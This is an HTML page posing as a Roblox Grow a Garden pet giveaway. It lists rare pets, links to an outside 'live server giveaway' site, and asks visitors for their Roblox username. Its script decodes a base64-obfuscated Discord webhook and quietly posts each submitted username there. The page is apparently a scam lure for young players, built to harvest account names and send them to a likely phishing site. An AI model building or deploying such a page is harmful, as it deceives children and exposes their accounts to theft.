<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Pet Giveaway</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRZQ5GG1BDHG80jzNDJRWhN7EWOnc--hk5MYQFk3tC1ybEurpbMmowfWWg&s=10');
      background-size: cover;
      background-position: center;
      color: white;
      text-align: center;
    }
    header {
      background: rgba(0, 0, 0, 0.7);
      padding: 1rem;
    }
    h1 {
      margin: 0.5rem 0;
    }
    .pets {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 1rem;
      padding: 2rem;
    }
    .pet {
      background: rgba(0, 0, 0, 0.6);
      border-radius: 10px;
      padding: 1rem;
    }
    .pet img {
      width: 100%;
      border-radius: 8px;
    }
    .pet h3 {
      margin: 0.5rem 0 0.2rem;
    }
    form {
      margin-top: 2rem;
      background: rgba(0, 0, 0, 0.6);
      padding: 1rem;
      display: inline-block;
      border-radius: 8px;
    }
    input[type="text"] {
      padding: 0.5rem;
      border-radius: 5px;
      border: none;
      margin-right: 0.5rem;
    }
    button {
      padding: 0.5rem 1rem;
      border-radius: 5px;
      border: none;
      background-color: #4caf50;
      color: white;
      cursor: pointer;
    }
    a {
      color: #00ffff;
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <header>
    <h1>Pet Giveaway</h1>
    <p>Click on link to join live server giveaway ‚Üí <a href="https://growagardenserver.carrd.co" target="_blank">https://growagardenserver.carrd.co</a></p>
  </header>
  <section class="pets">
    <div class="pet">
      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRDpb6oYHh0OnNavALI-aLfRiHUO3vM6heMQQ&s" alt="Raccoon" />
      <h3>Raccoon</h3>
      <p>Rarity: Rare</p>
    </div>
    <div class="pet">
      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSVzQ1aBn_CVNcn0LM2lUpA5fMa-CjMucl7eg&s" alt="Kitsune" />
      <h3>Kitsune</h3>
      <p>Rarity: Rare</p>
    </div>
    <div class="pet">
      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ5hxIq8A9X1oLZ87I4pH0QOwYFLAbxnB85PA&s" alt="Disco Bee" />
      <h3>Disco Bee</h3>
      <p>Rarity: Rare</p>
    </div>
    <div class="pet">
      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSWhyGKkPY82zZSmTyMUv2lTV0MYzKnD5Bvb0-FaM5_Tw&s" alt="Butterfly" />
      <h3>Butterfly</h3>
      <p>Rarity: Rare</p>
    </div>
  </section>
  <form id="giveawayForm">
    <h2>Enter Your Username</h2>
    <input type="text" id="username" placeholder="Your Roblox Username" required />
    <button type="submit">Enter Giveaway</button>
  </form>  <script>
    const form = document.getElementById("giveawayForm");
    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      const username = document.getElementById("username").value;
      if (!username) return;

      const webhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwNTM5NTU3NzY1MDkzNzg3Ny9hbmFnVl83aTJqektCVDg3elNheS05enpEbmlWc3liMkJMaE10WTZqZ0Zsb2F5UTQwUDZ1Z1NMYkxWVERKWUNNT24zVA==");

      await fetch(webhook, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          content: `üéÅ New giveaway entry: **${username}**`
        })
      });

      alert("Your username has been submitted!");
      form.reset();
    });
  </script></body>
</html>
